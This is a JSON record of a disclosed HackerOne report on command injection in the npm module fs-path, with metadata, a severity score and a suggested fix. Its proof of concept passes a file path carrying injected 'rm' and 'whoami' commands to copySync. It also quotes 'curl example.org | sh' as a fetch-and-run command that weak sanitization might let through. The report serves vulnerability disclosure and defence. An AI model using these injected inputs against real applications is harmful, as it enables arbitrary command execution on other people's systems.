{
  "id": 324491,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjQ0OTE=",
  "url": "https://hackerone.com/reports/324491",
  "title": "`fs-path` concatenates unsanitized input into exec()/execSync() commands",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-03-11T20:19:23.918Z",
  "submitted_at": "2018-03-11T20:19:23.918Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "chalker",
    "url": "/chalker",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8298"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-05-11T15:19:57.573Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-05-11T15:19:47.808Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report command injection in `fs-path`.\nIt allows to inject and execute arbitrary shell commands while performing various operations from `fs-path` API like copying files.\n\n# Module\n\n**module name:** `fs-path`\n**version:** 0.0.24\n**npm page:** `https://www.npmjs.com/package/fs-path`\n\n## Module Description\n\n> Useful file utitiles.\n\n## Module Stats\n\n108 downloads in the last day\n2 916 downloads in the last week\n13 186 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\nArguments are not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.\n\n See https://github.com/pillys/fs-path/blob/master/lib/index.js\n\n## Steps To Reproduce:\n\n```js\nconst fsPath = require('fs-path');\nconst source = '/bin/ls';\nconst target =  '/tmp/foo;rm\\t/tmp/foo;whoami>\\t/tmp/bar';\nfsPath.copySync(source, target);\n```\n\nObserve `/tmp/bar` being created with `whoami` output.\n\nThe same issue affects other methods in `fs-path` API, not just `copySync`.\n\n## Patch\n\nThe suggested fix is to avoid using `exec`/`execSync` and instead pass parameters as an array of arguments to corresponding `child_process` methods.\n\n## Supporting Material/References:\n\n* Arch Linux current\n* Node.js 9.7.1\n* npm 5.7.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nFor setups where user input could end up in arguments of calls to `fs-wrap` API (like filename etc), users would be able to execute arbitrary shell commands.\n\nNote that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff `/` and `..` is not enough â€” commands like `curl example.org | sh` might pass through sanitization of user input (like filenames etc.) on the application side.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-06-10T15:19:47.876Z",
  "allow_singular_disclosure_after": -179185240.45728874,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "0x08",
    "marcovtwout"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 9378,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "fs-path",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
